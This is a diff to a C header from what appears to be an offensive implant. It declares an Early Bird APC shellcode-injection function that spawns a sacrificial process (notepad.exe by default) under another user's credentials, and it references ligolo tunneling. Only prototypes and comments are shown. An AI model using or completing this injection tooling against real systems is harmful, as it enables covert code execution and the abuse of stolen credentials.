@@ -3,7 +3,7 @@
 
 #include <windows.h>
 
-#if defined(INCLUDE_CMD_SPAWN) || defined(INCLUDE_CMD_SPAWNTO) || defined(INCLUDE_CMD_LIGOLO_START)
+#if defined(INCLUDE_CMD_SPAWN) || defined(INCLUDE_CMD_SPAWNTO) || defined(INCLUDE_CMD_LIGOLO_START) || defined(INCLUDE_CMD_SPAWNAS)
 
 /* Default sacrificial host process */
 #define INJECT_DEFAULT_SPAWNTO "C:\\Windows\\System32\\notepad.exe"
@@ -30,6 +30,17 @@ int earlybird_inject(const unsigned char *shellcode, size_t shellcode_len,
                      const char *cmdline_override,
                      EarlyBirdResult *out, char *errmsg, size_t errmsg_len);
 
-#endif /* INCLUDE_CMD_SPAWN || INCLUDE_CMD_SPAWNTO || INCLUDE_CMD_LIGOLO_START */
+/*
+ * Early Bird APC injection into g_spawnto_path, spawned under another user's credentials.
+ * Uses CreateProcessWithLogonW with LOGON_WITH_PROFILE (full token, process runs as the target user).
+ * domain: NetBIOS domain or "." for local account.
+ * Returns 1 on success - caller owns out->hProcess and out->hThread.
+ * Returns 0 on failure - errmsg filled with reason.
+ */
+int earlybird_inject_asuser(const unsigned char *shellcode, size_t shellcode_len,
+                             const char *username, const char *domain, const char *password,
+                             EarlyBirdResult *out, char *errmsg, size_t errmsg_len);
+
+#endif /* INCLUDE_CMD_SPAWN || INCLUDE_CMD_SPAWNTO || INCLUDE_CMD_LIGOLO_START || INCLUDE_CMD_SPAWNAS */
 
 #endif /* KRATOS_INJECT_H */
